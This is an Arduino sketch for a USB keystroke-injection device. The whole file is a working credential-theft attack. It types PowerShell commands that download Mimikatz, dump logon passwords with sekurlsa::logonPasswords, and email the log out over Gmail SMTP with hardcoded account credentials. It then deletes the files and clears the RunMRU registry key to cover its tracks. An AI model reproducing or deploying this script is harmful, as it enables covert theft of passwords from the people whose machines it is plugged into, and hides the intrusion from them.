/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

void wait(int sec)
{
  delay(sec);
  typeKey(KEY_RETURN);
  delay(sec);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(10000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);
  
  delay(1000);
  
  //download Mimikatz

  Keyboard.print("powershell -command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $cli = New-object System.Net.WebClient; $cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'; $cli.Headers['Accept'] = ' text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'; $cli.Headers['Accept-Encoding'] = ' gzip, deflate, br '; $cli.Headers['Accept-Language'] = ' zh-CN,zh;q=0.9'; $cli.Headers['Upgrade-Insecure-Requests'] = '1'; $cli.DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190720/mimikatz_trunk.zip','$env:USERPROFILE\\Documents\\M1M1.zip')\"");
  
  delay(5000);
  
  typeKey(KEY_RETURN);
  
  delay(5000);
  
  Keyboard.print("mkdir $env:USERPROFILE\\Documents\\mimi");
  
  wait(5000);
  
  Keyboard.print("powershell");
  
  wait(5000);
  
  //unzip Mimikatz to get the .exe
  
  Keyboard.print("$shell = New-Object -ComObject Shell.Application");
  
  wait(5000);
  
  Keyboard.print("$zip = $shell.NameSpace(\"$env:USERPROFILE\\Documents\\M1M1.zip\")");
  
  wait(5000);
  
  Keyboard.print("$shell.NameSpace(\"$env:USERPROFILE\\Documents\\mimi\").CopyHere($zip.Items())");

  wait(5000);
  
  Keyboard.print("exit");
  
  wait(5000);
  
  //open up Mimikatz and log the output
  
  Keyboard.print("powershell if ([System.IntPtr]::Size -eq 4) {$env:USERPROFILE\\Documents\\mimi\\Win32\\mimikatz.exe > $env:USERPROFILE\\Documents\\mimi\\32log.txt;}else{$env:USERPROFILE\\Documents\\mimi\\x64\\mimikatz.exe > $env:USERPROFILE\\Documents\\mimi\\64log.txt;} ");
  
  wait(5000);
  
  Keyboard.print("privilege::debug");

  wait(5000);
  
  Keyboard.print("sekurlsa::logonPasswords full");
  
  wait(5000);
  
  Keyboard.print("exit");
  
  wait(500);
  
  //send the output activity log to burner email

  Keyboard.print("powershell -command \"$smtp = New-object Net.Mail.SmtpClient(\"smtp.gmail.com\", \"587\"); $smtp.EnableSsl = $true;$email = \"franklinyou55@gmail.com\"; $pass = \"YouAre1337\"; $mail = new-Object Net.Mail.MailMessage; $mail.From = \"$email\"; $mail.To.Add(\"$email\"); $mail.Subject = \"report\"; $mail.Body = \"You are 1337\"; if ([System.IntPtr]::Size -eq 4) {$mail.Attachments.Add(\"$env:USERPROFILE\\Documents\\mimi\\32log.txt\");}else{$mail.Attachments.Add(\"$env:USERPROFILE\\Documents\\64log.txt\");} $smtp.Credentials = new-Object System.Net.NetworkCredential(\"$email\", \"$pass\"); $smtp.send($mail);");
 
  wait(5000);
  
  /* clean up data */

  Keyboard.print("rmdir /S $env:USERPROFILE\\Documents\\mimi");
  
  wait(500);
  
  Keyboard.print("y");
  
  typeKey(KEY_RETURN);

  delay(200);
  
  Keyboard.print("del $env:USERPROFILE\\Documents\\M1M1.zip");
  
  wait(500);

  Keyboard.print("powershell -command \"Remove-ItemProperty -Path 'HKEY_CURRENT_USER:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\' -Name '*'\"");
  
  wait(1000);
  
  
  /* exit cmd */
  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(200);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
